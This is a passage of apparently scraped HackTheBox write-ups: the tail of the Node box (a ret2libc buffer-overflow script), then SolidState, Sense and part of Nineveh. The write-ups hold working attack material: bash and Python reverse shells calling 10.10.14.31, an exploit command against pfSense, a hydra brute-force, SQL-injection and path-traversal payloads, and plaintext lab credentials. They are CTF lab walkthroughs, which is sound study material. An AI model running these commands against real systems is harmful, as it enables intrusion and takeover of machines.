backup tom@node:/usr/local/bin$ ltrace backup -q &#39;&#39; /home/tom/user.txt __libc_start_main(0x80489fd, 4, 0xff9149f4, 0x80492c0 &amp;lt;unfinished ...&amp;gt; geteuid() = 1000 setuid(1000) = 0 strcmp(&quot;-q&quot;, &quot;-q&quot;) = 0 strncpy(0xff9148b8, &quot;&quot;, 100) = 0xff9148b8 strcpy(0xff9148a1, &quot;/&quot;) = 0xff9148a1 strcpy(0xff9148ad, &quot;/&quot;) = 0xff9148ad strcpy(0xff914837, &quot;/e&quot;) = = nil strcpy is used, allowing bufferoverflow Return to libc attack bruteforce An attacker overflows a buffer on the process stack with NOP sleds and a payload to overwrite the return address (at the end of a function) in such a way that the pointed-to address is somewhere in the NOP sled. The CPU will then slide to the payload and execute it. - Source Overwrite the return address to an address that points to system(&quot;/bin/bash&quot;) Bruteforce because ASLR is enabled &amp;amp; we have unlimited attempts on the binary Use binary ninja to examine backup to determine the vulnerable function After selecting the binary, click on strcpy -&amp;gt; displayTarget Double-Click to view displayTarget sub esp, 0x208 - Make space on ESP (Effective Stack Pointer), 208 (HEX) -&amp;gt; 520 Bytes Able to bufferoverflow at 500-600bytes. We have to figure out how to trigger the displayTarget output Starting archiving ... Figure out how trigger Starting archiving… by playing w/ the options # Does not trigger it tom@node:/tmp$ backup -q &#39;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#39; /root [+] Finished! Encoded backup is below: UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA== # Does not trigger it tom@node:/tmp$ backup -q &#39;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#39; /home/tom/user.txt UEsDBAoACQAAAIpQG1V42e7cLQAAACEAAAARABwAaG9tZS90b20vdXNlci50eHRVVAkAAxTeCWP69wljdXgLAAEEAAAAAAToAwAAqyveVp3UN3zrXMtAdVW840CnqZI64hHkLBknnJJWuzYa+hiPFcpbtI9Ko5mxUEsHCHjZ7twtAAAAIQAAAFBLAQIeAwoACQAAAIpQG1V42e7cLQAAACEAAAARABgAAAAAAAEAAACggQAAAABob21lL3RvbS91c2VyLnR4dFVUBQADFN4JY3V4CwABBAAAAAAE6AMAAFBLBQYAAAAAAQABAFcAAACIAAAAAAA=tom@node:/tmp$ # Triggers it tom@node:/tmp$ backup anything &#39;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#39; /home/tom/user.txt ____________________________________________________ / \\ | _____________________________________________ | | | | | | | | | | | | | | | | | | | | | | | | | | | Secure Backup v1.0 | | | | | | | | | | | | | | | | | | | | | | | | | | | |_____________________________________________| | | | \\_____________________________________________________/ \\_______________________________________/ _______________________________________________ _-&#39; .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-. --- `-_ _-&#39;.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--. .-.-.`-_ _-&#39;.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_ _-&#39;.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_ _-&#39;.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_ :-----------------------------------------------------------------------------: `---._.-----------------------------------------------------------------._.---&#39; [+] Validated access token [+] Starting archiving /home/tom/user.txt [+] Finished! Encoded backup is below: UEsDBAoACQAAAIpQG1V42e7cLQAAACEAAAARABwAaG9tZS90b20vdXNlci50eHRVVAkAAxTeCWP69wljdXgLAAEEAAAAAAToAwAAWpvzmHE0Ysg65kU05XfXFaakSKsxcdcTxmdhuIZfdvKj1Ju0o6Sg+SYeqDH3UEsHCHjZ7twtAAAAIQAAAFBLAQIeAwoACQAAAIpQG1V42e7cLQAAACEAAAARABgAAAAAAAEAAACggQAAAABob21lL3RvbS91c2VyLnR4dFVUBQADFN4JY3V4CwABBAAAAAAE6AMAAFBLBQYAAAAAAQABAFcAAACIAAAAAAA= -q , must not be there backup &amp;lt;anything&amp;gt; KEY &amp;lt;BOF&amp;gt; Buffer Overflow Create pattern ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot] └─# msf-pattern_create -l 600 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9 Determine Pattern Address gdb-peda$ r asdf a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9 Determine EIP offset ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot] └─# msf-pattern_offset -q 0x31724130 [*] Exact match at offset 512 EIP Offset: 512 ret2libc.py #!/usr/bin/env python import struct from subprocess import call libc_base_addr = system_off = exit_off = arg_off = system_addr = struct.pack(&quot;&amp;lt;I&quot;, libc_base_addr+system_off) exit_addr = struct.pack(&quot;&amp;lt;I&quot;,libc_base_addr+exit_off) arg_addr = struct.pack(&quot;&amp;lt;I&quot;,lib_base_addr+arg_off) buf = &quot;A&quot; * 512 buf += system_addr buf += exit_addr buf += arg_addr i=0 while (i&amp;lt;512): print &quot;Try %s&quot; %i i += 1 ret = call([&quot;/usr/local/bin/backup&quot;, buf]) Obtain lib_base_addr tom@node:/tmp$ ldd /usr/local/bin/backup | grep libc.so.6 libc.so.6 =&amp;gt; /lib32/libc.so.6 (0xf7529000) tom@node:/tmp$ ldd /usr/local/bin/backup | grep libc.so.6 libc.so.6 =&amp;gt; /lib32/libc.so.6 (0xf7563000) tom@node:/tmp$ ldd /usr/local/bin/backup | grep libc.so.6 libc.so.6 =&amp;gt; /lib32/libc.so.6 (0xf7551000) tom@node:/tmp$ ldd /usr/local/bin/backup | grep libc.so.6 libc.so.6 =&amp;gt; /lib32/libc.so.6 (0xf75f5000) tom@node:/tmp$ ldd /usr/local/bin/backup | grep libc.so.6 libc.so.6 =&amp;gt; /lib32/libc.so.6 (0xf760d000) tom@node:/tmp$ ldd /usr/local/bin/backup | grep libc.so.6 libc.so.6 =&amp;gt; /lib32/libc.so.6 (0xf756a000) Changes because of ASLR, but eventually we’ll get it correct lib_base_addr = 0xf7529000 At the first attempt of ret2libc.py, I got a bad character, causing the trollface output, change address if that happens Obtain system_off tom@node:/tmp$ readelf -s /lib32/libc.so.6 | grep system 245: 00110820 68 FUNC GLOBAL DEFAULT 13 svcerr_systemerr@@GLIBC_2.0 627: 0003a940 55 FUNC GLOBAL DEFAULT 13 __libc_system@@GLIBC_PRIVATE 1457: 0003a940 55 FUNC WEAK DEFAULT 13 system@@GLIBC_2.0 system_off = 0x0003a940 Obtain exit_off tom@node:/tmp$ readelf -s /lib32/libc.so.6 | grep &#39; exit@@&#39; 141: 0002e7b0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0 exit_off = 0x0002e7b0 Obtain arg_off - where /bin/sh is tom@node:/tmp$ strings -a -t x /lib32/libc.so.6 | grep bin/sh 15900b /bin/sh /arg_off = 0x00015900b Final ret2libc.py script from subprocess import call import struct libc_base_addr = 0xf7529000 system_off = 0x0003a940 exit_off = 0x0002e7b0 arg_off = 0x00015900b system_addr = struct.pack(&quot;&amp;lt;I&quot;, libc_base_addr+system_off) exit_addr = struct.pack(&quot;&amp;lt;I&quot;,libc_base_addr+exit_off) arg_addr = struct.pack(&quot;&amp;lt;I&quot;,libc_base_addr+arg_off) buf = &quot;A&quot; * 512 buf += system_addr buf += exit_addr buf += arg_addr i=0 while (i&amp;lt;512): i += 1 ret = call([&quot;/usr/local/bin/backup&quot;,&quot;ippsec&quot;,&quot;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&quot;,buf]) print &quot;Try %s&quot; %i Run ret2libc.py " }, { "title": "HackTheBox - SolidState", "url": "/posts/SolidState/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "jail", "date": "2022-08-25 00:00:00 +0800", "snippet": "OverviewThis machine w/ an network enumeration, enumerating a service James Server 2.3.2, which is susceptible to an authenticated RCE exploit.Also, James Server 2.3.2 is configured w/ its default password, allowing us to view users on the machine as well as change their password, allowing us to access mindy’s mail w/ SMTP, revealing SSH creds.After SSH w/ mindy’s creds, we are locked in a jailshell, but w/ the James Server 2.3.2 exploit, we are able to execute a reverse shell, spawning another shell, escaping the jailshell.For privilege escalation, after enumerating the system w/ linpeas.sh, there is a file that is out of the norm /opt/tmp.py and mindy has RWX access to it. Also, pspy32 detected a cronjob is executing /opt/tmp.py as root every 3 minutes. To exploit, we replace /opt/tmp.py w/ a python reverse shell, escalating our privilege to root. Column Details Box Name Solid State IP 10.10.10.51 Points - Difficulty Medium Creator ch33zplz Release Date 08-Sep-2017 ReconTCP/80 (HTTP)FFUF200 GET 63l 2733w 17128c http://10.10.10.51/LICENSE.txt200 GET 34l 133w 963c http://10.10.10.51/README.txt200 GET 129l 789w 7183c http://10.10.10.51/about.html301 GET 9l 28w 311c http://10.10.10.51/assets =&amp;gt; http://10.10.10.51/assets/301 GET 9l 28w 311c http://10.10.10.51/images =&amp;gt; http://10.10.10.51/images/200 GET 179l 680w 7776c http://10.10.10.51/index.html403 GET 11l 32w 299c http://10.10.10.51/server-status200 GET 130l 967w 8404c http://10.10.10.51/services.htmlTCP/4555 (James Server 2.3.2)NMAP4555/tcp open rsip? syn-ack ttl 63| fingerprint-strings: | GenericLines: | JAMES Remote Administration Tool 2.3.2| Please enter your login and password| Login id:| Password:| Login failed for |_ Login id: JAMES Remote Administration Tool 2.3.2NC┌──(root💀kali)-[~/htb/solidstate]└─# nc $ip 4555JAMES Remote Administration Tool 2.3.2Please enter your login and passwordLogin id:Initial FootholdTCP/80 (HTTP) After browsing through the webserver, could not find anything interesting.TCP/4555 (James Server 2.3.2) TCP/4555 - James Server 2.3.2 is out of the norm, we have to enumerate the service. James Server 2.3.2 James stands for Java Apache Mail Enterprise Server It has a modular architecture based on a rich set of modern and efficient components which provides at the end complete, stable, secure and extendable Mail Servers running on the JVM. Default Credentials root:root Search exploits for James, found exact matches to our version Exploit Title Path Apache James Server 2.2 - SMTP Denial of Service multiple/dos/27915.pl Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploi linux/remote/48130.rb Apache James Server 2.3.2 - Remote Command Execution linux/remote/35513.py Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2) linux/remote/50347.py Try linux/remote/35513.py How does the exploit work? Due the lack of input sanitization when creating a user in James Server 2.3.2, messages for a given user are stored in a directory partially defined by the username, by creating a user w/ path traversal payload (../) as its username, commands can be written to a given directory. The exploit could work w/ cronjob so that we get a shell after cronjob executes, however, it is not guarenteed to work due to how cron may run in certain Linux systems. Preferably, we set the target to bash completion, and when the user logs into the system, the payload will be executed. The exploit requires us to login to James Server 2.3.2 and also into the system in order for the payload to be executed. Lets enumerate SMTP, POP3 before continuing w/ the exploit Before exploiting James Server 2.3, access it w/ default creds to do further enumeration HELP to view commands listusers, we are able to list users in the system setpassword, we are able to change any user’s password, allowing us to access their account through SMTP and read mails. View users on the system Users: james thomas john mindy mailadmin Change all users password to password setpassword james password setpassword thomas password setpassword john password setpassword mindy password setpassword mailadmin password Accessing the SMTP Server Access SMTP server w/ POP3 ┌──(root💀kali)-[~/htb/solidstate/10.10.10.51/exploit] └─# telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is &#39;^]&#39;. +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER mindy +OK PASS password +OK Welcome mindy list +OK 2 1945 1 1109 2 836 . thomas - No mails james - No mail john - No mails mindy - Found mails View mail w/ thunderbird mindy:P@55W0rd1!2@ TCP/22 (SSH) Access w/ mindy:P@55W0rd1!2@ ┌──(root💀kali)-[~/htb/solidstate/10.10.10.51/exploit] └─# sshpass -p &#39;P@55W0rd1!2@&#39; ssh mindy@10.10.10.51 rbash We are in a jail shell Escape it Earlier, we found an RCE exploit on James Server 2.3.2 that executes the payload when the user logs in, we can use this to escape the jail shell.TCP/4555 (James Server 2.3.2) - RCE exploit Try linux/remote/35513.py Change payload in /linux/remote/35513.py ... payload = &#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.31/4444 0&amp;gt;&amp;amp;1&#39; ... Run exploit ┌──(root💀kali)-[~/htb/solidstate/10.10.10.51/exploit] └─# python 35513.py 10.10.10.51 [+]Connecting to James Remote Administration Tool... [+]Creating user... [+]Connecting to James SMTP server... [+]Sending payload... [+]Done! Payload will be executed once somebody logs in. Start listener Login to mindy ┌──(root💀kali)-[~/htb/solidstate/10.10.10.51/exploit] └─# sshpass -p &#39;P@55W0rd1!2@&#39; ssh mindy@10.10.10.51 Jailshell escaped! User Flag 4d9a00315a76957167ef83161bd7abe9 Privilege EscalationRoot - Via Cronjob Found something interesting w/ linpeas.sh We have RWX access to /opt/tmp.py Sniff processes w/ pspy32 A cronjob running as root is executing /opt/tmp.py every 3 minutes Exploit How does it work? Since we have RWX to /opt/tmp.py and it is being executed as root, we can replace /opt/tmp.py w/ a python reverse shell to escalate our privileges to root Create python script mindy@solidstate:~/bin$ nano /tmp/tmp.py import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.31&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]); Replace /opt/tmp.py w/ /tmp/tmp.py mindy@solidstate:~/bin$ cp /tmp/tmp.py /opt/tmp.py Start listener and wait for cronjob to execute Obtained Shell &amp;amp; Root Flag fec122a2b91fc6cf33e0ad4276a685ad " }, { "title": "HackTheBox - Sense", "url": "/posts/Sense/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "tcp/80-http/web-app-cms-exploit", "date": "2022-08-24 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a directory enumeration, a file containing credentials is enumerated, allowing us to login to pfsense. pfsense version is revealed upon login in, allowing us to find a RCE exploit due to the lack of input sanitization, allowing us to obtain a root shell instantly. Column Details Box Name Sense IP 10.10.10.60 Points - Difficulty Easy Creator lkys37en Release Date 21-Oct-2017 ReconTCP/80 (HTTP) Redirects to TCP/443 (HTTPS)TCP/443 (HTTPS)FFUF - common.txt200 GET 10l 40w 271c https://10.10.10.60/changelog.txt301 GET 0l 0w 0c https://10.10.10.60/classes =&amp;gt; https://10.10.10.60/classes/301 GET 0l 0w 0c https://10.10.10.60/css =&amp;gt; https://10.10.10.60/css/200 GET 173l 425w 0c https://10.10.10.60/edit.php200 GET 173l 425w 0c https://10.10.10.60/exec.php200 GET 7l 24w 1406c https://10.10.10.60/favicon.ico200 GET 173l 425w 0c https://10.10.10.60/graph.php200 GET 173l 425w 0c https://10.10.10.60/help.php301 GET 0l 0w 0c https://10.10.10.60/includes =&amp;gt; https://10.10.10.60/includes/200 GET 24l 32w 329c https://10.10.10.60/index.html200 GET 173l 425w 0c https://10.10.10.60/index.php301 GET 0l 0w 0c https://10.10.10.60/installer =&amp;gt; https://10.10.10.60/installer/301 GET 0l 0w 0c https://10.10.10.60/javascript =&amp;gt; https://10.10.10.60/javascript/200 GET 173l 425w 0c https://10.10.10.60/license.php200 GET 173l 425w 0c https://10.10.10.60/pkg.php200 GET 173l 425w 0c https://10.10.10.60/status.php200 GET 173l 425w 0c https://10.10.10.60/stats.php200 GET 173l 425w 0c https://10.10.10.60/system.php301 GET 0l 0w 0c https://10.10.10.60/themes =&amp;gt; https://10.10.10.60/themes/301 GET 0l 0w 0c https://10.10.10.60/tree =&amp;gt; https://10.10.10.60/tree/301 GET 0l 0w 0c https://10.10.10.60/widgets =&amp;gt; https://10.10.10.60/widgets/200 GET 17l 26w 384c https://10.10.10.60/xmlrpc.php changelog.txtInitial FootholdTCP/443 - Thorough Directory Enumeration View changelog.txt ┌──(root💀kali)-[~/htb/sense] └─# curl -ks https://10.10.10.60/changelog.txt # Security Changelog ### Issue There was a failure in updating the firewall. Manual patching is therefore required ### Mitigated 2 of 3 vulnerabilities have been patched. ### Timeline The remaining patches will be installed during the next maintenance window 2 of 3 vulnerabilities have been patched Found login page at https://10.10.10.60 Found something interesting at the page source pfsense pfSense is a firewall/router computer software distribution based on FreeBSD FreeBSD is a free and open-source Unix-like operating system Tried some default pfsense credentials, failed Admin:pfsense admin:pfsense Search exploits for pfsense, exclude XSS, CSRF exploits Exploit Title Path pfSense - (Authenticated) Group Member Remote Command Execution (Metasploit) unix/remote/43193.rb pfSense 2.0.1 - Cross-Site Scripting / Cross-Site Request Forgery / Remote Command php/webapps/23901.txt pfSense 2.1 build 20130911-1816 - Directory Traversal php/webapps/31263.txt pfSense 2.2 - Multiple Vulnerabilities php/webapps/36506.txt pfSense 2.2.5 - Directory Traversal php/webapps/39038.txt pfSense 2.3.1_1 - Command Execution php/webapps/43128.txt pfsense 2.3.4 / 2.4.4-p3 - Remote Code Injection php/webapps/47413.py pfSense &amp;lt; 2.1.4 - ‘status_rrd_graph_img.php’ Command Injection php/webapps/43560.py pfSense Community Edition 2.2.6 - Multiple Vulnerabilities php/webapps/39709.txt I tried some of the exploits, I think most requires authentication, at this point, I am stuck so I went to look at the forum for nudges We are supposed to enumerate a file that reveals a username Despite using directory-list-2.3-medium.txt, common.txt, the file is still not found. We have to add custom extensions Directory enumerate ┌──(root💀kali)-[~/htb/sense] └─# ffuf -u https://10.10.10.60/W1.W2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:W1 -w /usr/share/wordlists/SecLists/Fuzzing/extensions-most-common.fuzz.txt:W2 -fw 33,907 -t 1000 :: Method : GET :: URL : https://10.10.10.60/W1.W2 :: Wordlist : W1: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Wordlist : W2: /usr/share/wordlists/SecLists/Fuzzing/extensions-most-common.fuzz.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 1000 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 33,907 ________________________________________________ [Status: 200, Size: 384, Words: 78, Lines: 17] * W1: xmlrpc * W2: php [Status: 200, Size: 271, Words: 35, Lines: 10] * W1: changelog * W2: txt [Status: 200, Size: 106, Words: 9, Lines: 7] * W1: system-users * W2: txt [WARN] Caught keyboard interrupt (Ctrl-C) system-users.txt View system-users.txt ┌──(root💀kali)-[~/htb/sense] └─# curl -ks https://10.10.10.60/system-users.txt ####Support ticket### Please create the following user username: Rohit password: company defaults Rohit:company defaults Successfully login w/ rohit:pfsense, found version of pfsense pfsense 2.1.3 TCP/443 (HTTPS) - pfSense &amp;lt;2.1.4 RCE Try php/webapps/43560.py How does the exploit work? pfSense before 2.1.4 allows remote authenticated users to execute arbitrary commands via (1) the hostname value to diag_dns.php in a Create Alias action, (2) the smartmonemail value to diag_smart.php, or (3) the database value to status_rrd_graph_img.php. (3) is used in this exploit Start listener Exploit ┌──(root💀kali)-[~/htb/sense/10.10.10.60/exploit] └─# python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.31 --lport 4444 --username rohit --password pfsense CSRF token obtained Running exploit... Exploit completed Root &amp;amp; User Flag 8721327cc232073b40d27d9c17e7348b d08c32a5d4f8c8b10e76eb51a69f1a86 Privilege EscalationAlready Root" }, { "title": "HackTheBox - Nineveh", "url": "/posts/Nineveh/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/file-inclusion/lfi, image-forensics", "date": "2022-08-24 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering a login page on both TCP/80 (HTTP) &amp;amp; TCP/443 (HTTPS) that is both susceptible to a bruteforce attack due to a weak password and the lack of bruteforce prevention.On TCP/443, phpLiteAdmin 1.9 is running, it is susceptible to a RCE exploit, an attacker is able to create a database w/ a .php file extension and a insert a PHP reverse shell into the values of the table. Also, after directory enumeration, a directory containing an image is discovered, after analyzing the image, SSH private key is embedded into the image.On TCP/80 there is a limited LFI vulnerability, combined w/ the exploit on TCP/443 (HTTPS) we are able to include the PHP reverse shell, obtaining a low-privilege/www-data shell.For privilege escalation we have to escalate our privileges twice, once to Amorois and to root. To privilege escalate to Amrois, use the SSH key found from the image. There are 2 ways to obtain root, chkrootkit &amp;amp; PolkitIf you wish to practice the same/similar LFI try Vulnhub Zico2. Column Details Box Name Nineveh IP 10.10.10.43 Points - Difficulty Medium Creator Yas3r Release Date 04-Aug-2017 ReconTCP/80 (HTTP)FFUF - directory-2.3-medium.txt┌──(root💀kali)-[~/htb/nineveh]└─# ffuf -u http://nineveh.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 200 GET 5l 25w 178c http://10.10.10.43/index.html200 GET 977l 5005w 0c http://10.10.10.43/info.php301 GET 9l 28w 315c http://10.10.10.43/department =&amp;gt; http://10.10.10.43/department/403 GET 11l 32w 299c http://10.10.10.43/server-status departmentTCP/443 (HTTPS)FFUF - directory-2.3-medium.txt200 GET 1l 3w 49c https://10.10.10.43/index.html301 GET 9l 28w 309c https://10.10.10.43/db =&amp;gt; https://10.10.10.43/db/403 GET 11l 32w 300c https://10.10.10.43/server-status301 GET 9l 28w 319c https://10.10.10.43/secure_notes =&amp;gt; https://10.10.10.43/secure_notes/ secure_notes dbInitial FootholdTCP/80 (HTTP) - Bruteforce Login Proceed to http://nineveh.htb/department, there is a login page Attempt SQLi Auth Bypass, failed! # Payload &#39; OR 1=1# &#39; OR 1=1 -- - Attempt default creds, noticed something interesting # Default Creds admin:admin admin:password It tells us that the password is invalid, meaning the username admin is valid Bruteforce w/ hydra ┌──(root💀kali)-[~/htb/nineveh] └─# hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-post-form &quot;/department/login.php:username=^USER^&amp;amp;password=^PASS^:Invalid Password!&quot; -VI ... [80][http-post-form] host: 10.10.10.43 login: admin password: 1q2w3e4r5t admin:1q2w3e4r5t Login w/ admin:1q2w3e4r5tTCP/80 (HTTP) - LFI Found a potential LFI vulnerability /manage.php?notes=files/ninevehNotes.txt check your secret folder to get in! figure it out! - some sort of hint? Tried to directory enumerate /department/FUZZ, nothing found I tried to enumerate it w/ a local file inclusion wordlist but it failed, there is probably some sort of input sanitization/checks. To verify that ../ is not sanitized, I tried to go back a directory ../ and include ninevehNotes.txt, it worked! # Current Dir /var/www/html/department # ninevehNotes.txt location /var/www/html/department/files/ninevehNotes.txt # Payload /manage.php?notes=../department/files/ninevehNotes.txt 1. ../ : goes back 1 dir = /var/www/html 2. /department/files : cd into department dir = /var/www/html/department/files 3. ninevehNotes.txt : the file we want Conclusion ../ - not sanitized/filtered Next, I try to exclude the file extension (.txt), an error is triggered /manage.php?notes=../department/files/ninevehNotes ninvehNotes - No such file or directory However, if i try to include a file that I know exists (index.html, nineveh.png) it does not work, there is no output 2 Conclusions Only .txt files will be shown/reflected # Hypothesis $path_parts = pathinfo(&#39;$_GET[&quot;notes&quot;]&#39;); if $path_parts[&#39;extension&#39;] = &quot;txt&quot; include $_GET[&quot;notes&quot;] Only filename that contains ninevehNotes will be shown # Hypothesis $path_parts = pathinfo(&#39;$_GET[&quot;notes&quot;]&#39;); if $path_parts[&#39;filename&#39;] = &quot;ninevehNotes&quot; include $_GET[&quot;notes&quot;] I tried to include ninevehNotes.html to see if an error is triggered, ninevehNotes.html - No such file or directory Conclusion The file that we want to include is processed only if it is named ninevehNotes.&amp;lt;ext&amp;gt; Since this is the case, we are not able to do LFI2RCE, move on to TCP/443 (HTTPS) TCP/443 - Image Forensics Proceed to /secure_notes, there is an image displayed Tried to directory enumerate /secure_notes/FUZZ, nothing found Download the image nineveh.png Check for comments w/ exiftool ┌──(root💀kali)-[~/htb/nineveh] └─# exiftool nineveh.png ExifTool Version Number : 12.39 File Name : nineveh.png Directory : . File Size : 2.8 MiB File Modification Date/Time : 2022:08:24 01:40:57+08:00 File Access Date/Time : 2022:08:24 01:40:56+08:00 File Inode Change Date/Time : 2022:08:24 01:40:57+08:00 File Permissions : -rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 1497 Image Height : 746 Bit Depth : 8 Color Type : RGB Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Significant Bits : 8 8 8 Software : Shutter Warning : [minor] Trailer data after PNG IEND chunk Image Size : 1497x746 